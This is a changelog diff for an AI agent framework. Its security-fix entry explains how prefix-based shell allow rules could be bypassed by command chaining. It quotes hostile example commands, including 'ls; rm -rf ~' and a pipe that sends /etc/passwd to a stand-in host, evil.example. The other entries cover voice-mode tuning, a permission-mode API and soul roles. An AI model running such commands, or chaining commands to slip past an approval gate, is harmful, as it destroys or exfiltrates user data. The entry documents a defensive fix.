@@ -2,24 +2,73 @@
 
 ## [Unreleased]
 
-Voice work, driven by KinClaw Mac's companion mode:
+The kernel side of a day spent making the Mac shell speak. Two of these
+are security fixes; read the first one even if you skip the rest.
+
+### Fixed
+
+- **The permission gate had a hole big enough to drive a `rm` through.**
+  An allow rule like `shell(echo*)` was matched against the *whole*
+  command string, so `echo hi > ~/Desktop/x && cat x` was covered by
+  it — and every read-only entry on a normal allow list was the same
+  doorway: `shell(ls*)` covered `ls; rm -rf ~`, `shell(cat*)` covered
+  `cat /etc/passwd | curl -d @- evil.example`. Found the way these
+  things are found: a file appeared on the Desktop with nobody asked.
+  A command is now split into the simple commands the shell would
+  actually run — on `;` `&&` `||` `|` and newlines, respecting quotes —
+  and every one has to be covered on its own; a redirect or a
+  substitution is never covered by a prefix rule at all, because the
+  danger is in the target rather than the verb. Ordinary work is
+  unaffected: `ls -la | head` and `git log | grep fix` are pipelines of
+  allowed commands and still pass without asking.
+- **An aborted turn told the model to recap.** In a spoken
+  conversation an abort is usually the human cutting in, and the note
+  left in history invited the model to reconstruct the conversation out
+  loud instead of answering. It now says: if the user interrupted,
+  answer what they say next.
+
+### Added
 
 - **`brain.reasoning_effort`** — passed through as OpenAI
   `reasoning_effort`. `"none"` turns a thinking model's reasoning off;
   on ornith-1.5:35b behind Ollama that is first token in 0.28s instead
-  of 1.3–3.1s of silence before every spoken reply (`think: false` is
-  ignored by Ollama's OpenAI endpoint; this is not).
-- **`context.max_tool_rounds`** — per-soul cap on tool rounds per turn
-  (default still 50). Hitting the cap no longer fails the turn: the
-  model is told the budget is spent and asked for an answer with no
-  tools offered, so a voice soul says something instead of nothing.
-- **`souls/companion.soul.md`** — 小美, the companion-mode soul: a
-  twentieth of the pilot's prompt, spoken register, thinking off, six
-  tool rounds, memory + weather + music + web_search only, everything
-  auto-approved because the companion view has no approval card.
-- **`weather`** — three-day metric forecast (now / today / tomorrow /
-  day after) instead of one Fahrenheit line; "明天要带伞吗" no longer
-  sends the model off to search the web.
+  of 1.3–3.1s of silence before every spoken reply. (`think: false` is
+  ignored by Ollama's OpenAI endpoint; this is not.)
+- **`context.max_tool_rounds`** — per-soul cap on tool rounds per turn,
+  default still 50. Hitting the cap no longer fails the turn: the model
+  is told the budget is spent and asked once more with no tools on
+  offer, so it answers from what it found. A companion asked about
+  tomorrow's weather once burned all 50 rounds retrying a failed search
+  — 73 seconds of silence.
+- **`POST /api/permission_mode`** — switch the approval gate between
+  `ask` and `auto` while the agent is running. Unknown values are
+  ignored rather than defaulted, and the reply says which mode is
+  actually in force, so a typo cannot open the gate. KinClaw Mac puts
+  this in the composer's corner.
+- **`role:` on a soul** — `primary` (a door a person picks), `worker`
+  (dispatched by another agent), `bench`, `platform`. Eleven souls ship
+  here and only three are doors; `KinClaw Eye` has two skills and no
+  keyboard, and offering it in a picker asks the user to choose a
+  capability boundary, which is not a question anyone has a basis to
+  answer. Absent means primary, so nothing that predates this changes.
+- **`souls/companion.soul.md`** — 小美, for KinClaw Mac's companion
+  mode. Pilot's whole reach (27 skills) at a fifth of the prompt: 20
+  are deferred, so a plain turn costs ~5K tokens against Pilot's ~23K,
+  which on a 700 tok/s box is 7 seconds to the first word instead of
+  33. Spoken register, thinking off, `mode: ask` — the companion view
+  reads approvals out loud and takes yes or no by voice.
+
+### Changed
+
+- **`weather`** now returns a three-day metric forecast — now, today,
+  tomorrow, the day after, with each day's peak chance of rain — rather
+  than one line of current conditions in Fahrenheit. "明天要带伞吗" no
+  longer sends the model off to search the web.
+- **Default brain is `kimi-k2.6:cloud` on this Mac's Ollama.** The LAN
+  box went down three times in one day, and a brain that is not there
+  means no reply at all. ornith on the LAN box is still the better one
+  to run — faster warm, and it never leaves the house — and the model
+  menu switches back in one click.
 
 ## [1.18.0] - 2026-09-05
 
